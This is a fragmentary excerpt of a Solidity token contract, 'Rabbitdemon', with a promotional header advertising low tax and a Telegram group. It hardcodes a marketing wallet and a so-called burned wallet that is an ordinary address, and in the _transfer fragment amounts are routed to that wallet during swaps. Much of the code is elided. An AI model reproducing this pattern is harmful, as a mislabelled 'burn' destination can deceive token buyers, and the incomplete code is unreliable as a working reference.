...
/**
   LOW TAX:2/2
   Initial LP:2 BNB
   TG GROUP：https://t.me/RabbitdemonBSC
*/
...
contract Rabbitdemon is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "Rabbitdemon";
    string private _symbol = "Rabbitdemon";
    uint8 private _decimals = 2;

    address payable public marketingWalletAddress =
        payable(0x27bb88ED6AeCfdB06bB5237e5B59e9E30270d4e9);
    address payable public BurnedWalletAddress =
        payable(0x897d1AB846c9DF8A66Ebf79Cfb0d7B9Bd81b3d80);
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            ...
            if (
                ...
                _basicTransfer(recipient, BurnedWalletAddress, finalAmount);
            }
            return true;
        }
    }
